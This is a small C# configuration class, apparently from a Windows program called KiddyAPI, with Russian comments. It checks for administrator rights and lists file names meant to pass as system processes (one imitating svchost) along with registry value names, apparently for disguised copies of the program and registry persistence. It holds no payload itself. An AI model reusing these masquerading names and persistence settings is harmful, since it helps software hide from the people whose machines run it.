using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace KiddyAPI.Protect
{
    /// <summary>
    /// Конфигурация различных модулей
    /// </summary>
    class Config
    {
        /// <summary>
        /// Поле, которое вернет true, если программа запущена под администратором, иначе false
        /// </summary>
        public static bool IsAdmin
        {
            get { return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.AccountAdministratorSid); }
        }
        public static string[] FileName = new string[2] { "audiohddddd.exe", "svvvvvvvhost.exe" };
        public static string[] RegName = new string[2] { "WOOOD", "OHMYGOD" };
    }
}
